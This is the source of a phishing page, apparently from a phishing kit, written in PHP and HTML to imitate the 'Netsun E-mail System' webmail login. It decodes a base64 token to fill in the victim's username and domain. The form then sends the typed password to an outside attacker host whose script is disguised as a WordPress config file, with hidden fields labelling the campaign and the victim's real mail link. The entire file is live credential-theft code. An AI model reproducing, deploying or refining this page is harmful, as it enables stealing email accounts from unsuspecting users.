<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Netsun E-mail System</title>
<link rel="shortcut icon" href="https://i.ibb.co/nnw97D1/url.jpg">
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 14px;
  font-weight: bold;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
input[type=text] {
  width: 100%;
  height: 45px;
  box-sizing: border-box;
  border: 1px solid #ccc;
  border-radius: 0px;
  font-size: 15px;
  font-family: Arial, Helvetica, sans-serif;
  background-color: white;
  background-image: url("https://i.ibb.co/r2cDyTj/id.jpg");
  background-position: 1px 5px; 
  background-repeat: no-repeat;
  padding: 10px 40px;
}
input[type=domain] {
  width: 100%;
  height: 45;
  box-sizing: border-box;
  border: 1px solid #ccc;
  border-radius: 0px;
  font-size: 15px;
  font-family: Arial, Helvetica, sans-serif;
  background-color: white;
  background-image: url("https://i.ibb.co/FzhTmHB/at.jpg");
  background-position: 2px 7px; 
  background-repeat: no-repeat;
  padding: 10px 40px;
  overflow: hidden;
  white-space: nowrap;
  text-overflow: ellipsis;
}
input[type=password] {
  width: 100%;
  height: 45;
  box-sizing: border-box;
  border: 1px solid #ccc;
  border-radius: 0px;
  font-size: 15px;
  font-family: Arial, Helvetica, sans-serif;
  background-color: white;
  background-image: url("https://i.ibb.co/f4BSthR/pw.jpg");
  background-position: 2px 7px; 
  background-repeat: no-repeat;
  padding: 10px 40px;
}
  input[type=text]:focus,
  input[type=domain]:focus,
  input[type=password]:focus {
  outline: none;
  border: 1px solid #cococo;  
}
</style
<body>
<body background="https://i.ibb.co/3cdhZk9/bg2.png">

<div align="center">
	<table border="0" width="1057" cellspacing="0" cellpadding="0" background="https://i.ibb.co/3T8h87Z/bg1.jpg" height="624">
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td height="112"></td>
				</tr>
				<tr>
					<td height="379">
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td></td>
							<td height="379" width="307">
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
							  <form action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="post" >
								<tr>
									<td height="80"></td>
								</tr>
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="30"></td>
											<td>
											   <input type="text" placeholder="username" name="user" value="<?php echo $users;?>" >
											</td>
											<td width="28"></td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="30"></td>
											<td>
								                           <input type="domain" name="domain" placeholder="domain" value="<?php echo $ddomain;?>" >
                                                                                           <input type="hidden" name="sender" value="Chinanetsun" >
                                                                                           <input type="hidden" name="link" value="http://mail.<?php echo $ddomain;?>/" >
											</td>
											<td width="28"></td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="30"></td>
											<td>
											   <input type="password" placeholder="password" name="passwd" value="" required autofocus > 
											</td>
											<td width="28"></td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="49">
									</td>
								</tr>
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="30"></td>
											<td>
											<input type="image" src="https://i.ibb.co/bQn4HqG/btn.png" width="251" height="44"></td>
											<td width="28"></td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="70" ></td>
								</tr>
								</form>
							</table>
							</td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td height="137"></td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>

</body>

</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>